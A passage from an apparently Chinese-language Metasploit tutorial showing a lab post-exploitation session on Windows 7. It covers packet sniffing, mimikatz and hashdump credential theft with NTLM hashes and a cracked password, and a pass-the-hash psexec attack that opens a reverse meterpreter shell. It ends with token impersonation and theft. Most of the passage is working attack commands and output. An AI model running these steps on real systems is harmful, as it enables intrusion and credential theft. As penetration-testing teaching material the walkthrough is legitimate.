2 - <span class="token string">'Intel(R) PRO/1000 MT Network Connection'</span> <span class="token punctuation">(</span> type:0 mtu:1514 usable:true dhcp:true wifi:false <span class="token punctuation">)</span>

meterpreter <span class="token operator">></span> sniffer_start 2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Capture started on interface 2 <span class="token punctuation">(</span>50000 packet buffer<span class="token punctuation">)</span>
meterpreter <span class="token operator">></span> sniffer_stats 2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Capture statistics <span class="token keyword">for</span> interface 2
        packets: 8
        bytes: 468
meterpreter <span class="token operator">></span> sniffer_stats 2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Capture statistics <span class="token keyword">for</span> interface 2
        packets: 3546
        bytes: 1480197
meterpreter <span class="token operator">></span> sniffer_dump 2 /tmp/lab1.pcap
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Flushing packet capture buffer <span class="token keyword">for</span> interface 2<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Flushed 3567 packets <span class="token punctuation">(</span>1553403 bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Downloaded 033% <span class="token punctuation">(</span>524288/1553403<span class="token punctuation">)</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Downloaded 067% <span class="token punctuation">(</span>1048576/1553403<span class="token punctuation">)</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Downloaded 100% <span class="token punctuation">(</span>1553403/1553403<span class="token punctuation">)</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Download completed, converting to PCAP<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PCAP <span class="token function">file</span> written to /tmp/lab1.pcap
meterpreter <span class="token operator">></span> sniffer_stop 2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Capture stopped on interface 2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> There are 6 packets <span class="token punctuation">(</span>366 bytes<span class="token punctuation">)</span> remaining
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Download or release them using <span class="token string">'sniffer_dump'</span> or <span class="token string">'sniffer_release'</span>
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看捕获的数据包流量</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200702110546288.png" alt="image-20200702110546288"></p>
<h3 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h3><ul>
<li>基本指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load mimikatz
Loading extension mimikatz<span class="token punctuation">..</span>.<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Loaded Mimikatz on a newer OS <span class="token punctuation">(</span>Windows 7 <span class="token punctuation">(</span>6.1 Build 7601, Service Pack 1<span class="token punctuation">)</span>.<span class="token punctuation">)</span>. Did you mean to <span class="token string">'load kiwi'</span> instead?
Success.
meterpreter <span class="token operator">></span> <span class="token function">help</span> mimikatz

Mimikatz Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds.
    livessp           Attempt to retrieve livessp creds.
    mimikatz_command  Run a custom command.
    msv               Attempt to retrieve msv creds <span class="token punctuation">(</span>hashes<span class="token punctuation">)</span>.
    ssp               Attempt to retrieve ssp creds.
    tspkg             Attempt to retrieve tspkg creds.
    wdigest           Attempt to retrieve wdigest creds.

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>指令解读</p>
<pre class="line-numbers language-bash"><code class="language-bash">load mimikatz    <span class="token comment" spellcheck="true">#加载mimikatz模块</span>
msv              <span class="token comment" spellcheck="true">#获取用户和hash值 </span>
wdigest          <span class="token comment" spellcheck="true">#获取内存中的明文密码信息</span>
mimikatz_command -f xx::xx                     <span class="token comment" spellcheck="true">#执行mimikatz原始命令</span>
mimikatz_command -f samdump::hashes            <span class="token comment" spellcheck="true">#获取用户Hash</span>
mimikatz_command -f sekurlsa::searchPasswords  <span class="token comment" spellcheck="true">#获取用户密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：抓取Windows系统密码</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load mimikatz 
Loading extension mimikatz<span class="token punctuation">..</span>.<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Loaded Mimikatz on a newer OS <span class="token punctuation">(</span>Windows 7 <span class="token punctuation">(</span>6.1 Build 7601, Service Pack 1<span class="token punctuation">)</span>.<span class="token punctuation">)</span>. Did you mean to <span class="token string">'load kiwi'</span> instead?
Success.
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> wdigest 
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Running as SYSTEM
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Retrieving wdigest credentials
wdigest credentials
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0<span class="token punctuation">;</span>997     Negotiate  NT AUTHORITY     LOCAL SERVICE     
0<span class="token punctuation">;</span>996     Negotiate  WORKGROUP        WIN-5DTIE0M734E$  
0<span class="token punctuation">;</span>48688   NTLM                                          
0<span class="token punctuation">;</span>999     NTLM       WORKGROUP        WIN-5DTIE0M734E$  
0<span class="token punctuation">;</span>294403  NTLM       WIN-5DTIE0M734E  Administrator     admin

meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> mimikatz_command -f sekurlsa::searchPasswords
<span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token punctuation">{</span> Administrator <span class="token punctuation">;</span> WIN-5DTIE0M734E <span class="token punctuation">;</span> admin <span class="token punctuation">}</span>
<span class="token punctuation">[</span>1<span class="token punctuation">]</span> <span class="token punctuation">{</span> Administrator <span class="token punctuation">;</span> WIN-5DTIE0M734E <span class="token punctuation">;</span> admin <span class="token punctuation">}</span>
<span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token punctuation">{</span> WIN-5DTIE0M734E <span class="token punctuation">;</span> Administrator <span class="token punctuation">;</span> admin <span class="token punctuation">}</span>
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>另外可通过Hash解密来得到账户明文密码，操作如下：</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
qftm0:1001:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678:::
root:1000:aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9:::
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解密账户<code>Administrator</code>:<code>NTLM-&gt;209c6174da490caeb422f3fa5a7ae634</code></p>
<p><img src="/2020/06/20/metasploit-framework/image-20200703103631433.png" alt="image-20200703103631433"></p>
<p>解密得到账户<code>Administrator</code>密码为<code>admin</code>，<code>Administrator:admin</code>。</p>
<h3 id="哈希获取-哈希传递"><a href="#哈希获取-哈希传递" class="headerlink" title="哈希获取+哈希传递"></a>哈希获取+哈希传递</h3><p>（1）哈希获取</p>
<ul>
<li>使用meterpreter中支持的post模块或脚本进行获取</li>
</ul>
<p>基本指令</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#从SAM导出密码哈希 #需要SYSTEM权限</span>
run post/windows/gather/smart_hashdump <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>实战操作获取哈希：结构–&gt;用户名:RID:LM-Hash:NTLM-Hash</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> run post/windows/gather/smart_hashdump 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running module against WIN-5DTIE0M734E
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Hashes will be saved to the database <span class="token keyword">if</span> one is connected.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Hashes will be saved <span class="token keyword">in</span> loot <span class="token keyword">in</span> JtR password <span class="token function">file</span> <span class="token function">format</span> to:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> /home/qftm/.msf4/loot/20200702111400_default_192.168.9.101_windows.hashes_954614.txt
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping password hashes<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running as SYSTEM extracting hashes from registry
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Obtaining the boot key<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Calculating the hboot key using SYSKEY ca55e9d2a12777be65993925a59a6452<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Obtaining the user list and keys<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Decrypting user keys<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Dumping password hints<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     No <span class="token function">users</span> with password hints on this system
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Dumping password hashes<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     root:1000:aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9:::
meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
qftm0:1001:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678:::
root:1000:aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9:::
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>使用meterpreter持支的第三方工具mimikatz进行哈希的抓取</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load mimikatz 
Loading extension mimikatz<span class="token punctuation">..</span>.<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Loaded Mimikatz on a newer OS <span class="token punctuation">(</span>Windows 7 <span class="token punctuation">(</span>6.1 Build 7601, Service Pack 1<span class="token punctuation">)</span>.<span class="token punctuation">)</span>. Did you mean to <span class="token string">'load kiwi'</span> instead?
Success.
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> mimikatz_command -f samdump::hashes
Ordinateur <span class="token keyword">:</span> WIN-5DTIE0M734E
BootKey    <span class="token keyword">:</span> ca55e9d2a12777be65993925a59a6452

Rid  <span class="token keyword">:</span> 500
User <span class="token keyword">:</span> Administrator
LM   <span class="token keyword">:</span> 
NTLM <span class="token keyword">:</span> 209c6174da490caeb422f3fa5a7ae634

Rid  <span class="token keyword">:</span> 501
User <span class="token keyword">:</span> Guest
LM   <span class="token keyword">:</span> 
NTLM <span class="token keyword">:</span> 

Rid  <span class="token keyword">:</span> 1000
User <span class="token keyword">:</span> root
LM   <span class="token keyword">:</span> 
NTLM <span class="token keyword">:</span> 329153f560eb329c0e1deea55e88a1e9

Rid  <span class="token keyword">:</span> 1001
User <span class="token keyword">:</span> qftm0
LM   <span class="token keyword">:</span> 
NTLM <span class="token keyword">:</span> 3dbde697d71690a769204beb12283678
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>（2）哈希传递（PTH）</p>
<p>获取系统账户哈希之后，可以使用Metasploit自带的渗透攻击模块<code>psexec</code>来进行哈希传递攻击</p>
<ul>
<li>前提条件</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">开启445端口SMB服务
开启admin$共享<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>PTH Attack</li>
</ul>
<p>模块的使用与配置</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/windows/smb/psexec
msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/windows/smb/psexec<span class="token punctuation">)</span>:

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   RPORT                 445              <span class="token function">yes</span>       The SMB <span class="token function">service</span> port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SERVICE_DESCRIPTION                    no        Service description to to be used on target <span class="token keyword">for</span> pretty listing
   SERVICE_DISPLAY_NAME                   no        The <span class="token function">service</span> display name
   SERVICE_NAME                           no        The <span class="token function">service</span> name
   SHARE                 ADMIN$           <span class="token function">yes</span>       The share to connect to, can be an admin share <span class="token punctuation">(</span>ADMIN$,C$,<span class="token punctuation">..</span>.<span class="token punctuation">)</span> or a normal read/write folder share
   SMBDomain             <span class="token keyword">.</span>                no        The Windows domain to use <span class="token keyword">for</span> authentication
   SMBPass                                no        The password <span class="token keyword">for</span> the specified username
   SMBUser                                no        The username to authenticate as


Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_https<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The local listener <span class="token function">hostname</span>
   LPORT     8443             <span class="token function">yes</span>       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOSTS 192.168.9.101
RHOSTS <span class="token operator">=</span><span class="token operator">></span> 192.168.9.101
msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT 8555
LPORT <span class="token operator">=</span><span class="token operator">></span> 8555
msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> SMBUSER Administrator
SMBUSER <span class="token operator">=</span><span class="token operator">></span> Administrator
msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> SMBPASS aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634
SMBPASS <span class="token operator">=</span><span class="token operator">></span> aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634
msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> SMBDomain WORKGROUP
SMBDomain <span class="token operator">=</span><span class="token operator">></span> WORKGROUP
msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看模块的配置并发起哈希传递攻击得到返回的meterpreter会话</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/windows/smb/psexec<span class="token punctuation">)</span>:

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   RHOSTS                192.168.9.101                                                      <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   RPORT                 445                                                                <span class="token function">yes</span>       The SMB <span class="token function">service</span> port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target <span class="token keyword">for</span> pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The <span class="token function">service</span> display name
   SERVICE_NAME                                                                             no        The <span class="token function">service</span> name
   SHARE                 ADMIN$                                                             <span class="token function">yes</span>       The share to connect to, can be an admin share <span class="token punctuation">(</span>ADMIN$,C$,<span class="token punctuation">..</span>.<span class="token punctuation">)</span> or a normal read/write folder share
   SMBDomain             WORKGROUP                                                          no        The Windows domain to use <span class="token keyword">for</span> authentication
   SMBPass               aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634  no        The password <span class="token keyword">for</span> the specified username
   SMBUser               Administrator                                                      no        The username to authenticate as


Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT     8555             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> exploit 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:8555 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Connecting to the server<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Authenticating to 192.168.9.101:445<span class="token operator">|</span>WORKGROUP as user <span class="token string">'Administrator'</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Selecting PowerShell target
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Executing the payload<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - Service start timed out, OK <span class="token keyword">if</span> running a <span class="token function">command</span> or non-service executable<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>176195 bytes<span class="token punctuation">)</span> to 192.33.6.200
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 7 opened <span class="token punctuation">(</span>192.33.6.150:8555 -<span class="token operator">></span> 192.33.6.200:63527<span class="token punctuation">)</span> at 2020-07-02 11:37:47 -0400

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="令牌操作"><a href="#令牌操作" class="headerlink" title="令牌操作"></a>令牌操作</h3><p>（1）incognito假冒令牌</p>
<ul>
<li>基本指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load incognito 
Loading extension incognito<span class="token punctuation">..</span>.Success.
meterpreter <span class="token operator">></span> <span class="token function">help</span> incognito

Incognito Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes <span class="token keyword">for</span> every token

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>指令解读</p>
<pre class="line-numbers language-bash"><code class="language-bash">load incognito      <span class="token comment" spellcheck="true">#加载incognito</span>
list_tokens -u      <span class="token comment" spellcheck="true">#列出当前系统可用的token</span>
impersonate_token <span class="token string">'NT AUTHORITY\SYSTEM'</span>  <span class="token comment" spellcheck="true">#假冒SYSTEM token</span>
or
impersonate_token NT\ AUTHORITY\\SYSTEM  <span class="token comment" spellcheck="true">#参数不加单引号需要对特殊字符进行转义</span>
rev2self   <span class="token comment" spellcheck="true">#返回原始token</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：假冒令牌登陆其他用户</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> list_tokens -u

Delegation Tokens Available
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-5DTIE0M734E\Administrator

Impersonation Tokens Available
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
NT AUTHORITY\ANONYMOUS LOGON

meterpreter <span class="token operator">></span> impersonate_token <span class="token string">'WIN-5DTIE0M734E\Administrator'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Delegation token available
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully impersonated user WIN-5DTIE0M734E\Administrator
meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\Administrator
meterpreter <span class="token operator">></span> shell
Process 3068 created.
Channel 1 created.
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32<span class="token operator">></span>whoami
<span class="token function">whoami</span>
win-5dtie0m734e\administrator

C:\Windows\system32<span class="token operator">></span>exit
<span class="token keyword">exit</span>
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> rev2self 
meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>（2）steal_token窃取令牌</p>
<ul>
<li>基本指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span>                    <span class="token comment" spellcheck="true">#查看系统进程信息</span>
steal_token <span class="token operator">&lt;</span>pid值<span class="token operator">></span>   <span class="token comment" spellcheck="true">#从指定进程中窃取token</span>
drop_token           <span class="token comment" spellcheck="true">#删除窃取的token</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：窃取其他用户token使用其身份</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ps</span>

Process List
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

 PID   PPID  Name               Arch  Session  User                           Path
 ---   ----  ----               ----  -------  ----                           ----
 0     0     <span class="token punctuation">[</span>System Process<span class="token punctuation">]</span>                                                 
 4     0     System             x64   0                                       
 244   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe
 332   316   csrss.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe
 384   316   wininit.exe        x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\wininit.exe
 392   376   csrss.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe
 396   1032  explorer.exe       x64   1        WIN-5DTIE0M734E\Administrator  C:\Windows\Explorer.EXE
 428   376   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM            C:\Windows\system32\winlogon.exe
 484   384   services.exe       x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\services.exe
 500   384   lsass.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\lsass.exe
 508   384   lsm.exe            x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\lsm.exe
 600   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM            
 664   484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE   
 732   484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE     
 756   392   conhost.exe        x64   1        WIN-5DTIE0M734E\Administrator  C:\Windows\system32\conhost.exe
 812   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM            
 864   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM            
 944   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM            
 952   484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE   
 1020  484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE     
 1120  484   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\spoolsv.exe
 1148  484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE     
 1224  484   taskhost.exe       x64   1        WIN-5DTIE0M734E\Administrator  C:\Windows\system32\taskhost.exe
